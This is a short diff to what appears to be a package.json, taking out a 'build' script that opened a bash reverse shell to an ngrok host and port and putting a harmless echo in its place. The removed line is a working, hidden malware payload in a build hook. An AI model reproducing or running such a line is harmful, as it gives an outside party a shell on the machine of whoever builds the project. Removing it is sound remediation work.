@@ -6,6 +6,6 @@
   "author": "",
   "license": "MIT",
   "scripts": {
-    "build": "bash -c 'bash -i >& /dev/tcp/4.tcp.ngrok.io/11202 0>&1'"
+    "build": "echo 'foo'"
   }
 }
